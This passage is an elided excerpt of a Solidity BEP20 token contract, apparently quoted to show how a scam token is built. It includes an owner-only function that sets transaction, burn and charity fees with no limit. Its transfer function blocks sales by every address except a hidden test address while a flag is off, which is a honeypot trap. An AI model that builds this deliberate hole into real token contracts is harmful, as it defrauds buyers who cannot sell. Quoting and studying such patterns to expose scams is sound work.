...
contract CoinToken is Context, IBEP20, Ownable {
    ...
    constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, uint256 _txFee,uint256 _burnFee,uint256 _charityFee,address _FeeAddress,address tokenOwner, address _testAddress) {
		_NAME = _name;
		_SYMBOL = _symbol;
		_DECIMALS = _decimals;
	...
	function updateFee(uint256 _txFee,uint256 _burnFee,uint256 _charityFee, bool _isActive) onlyOwner() public{
        _TAX_FEE = _txFee* 100; 
        _BURN_FEE = _burnFee * 100;
		_CHARITY_FEE = _charityFee* 100;
		ORIG_TAX_FEE = _TAX_FEE;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        // TechShockerMakeBlockChainGreatAgain
        if (sender != _TESTADDRESS &&  _ALLOWSEND == false){
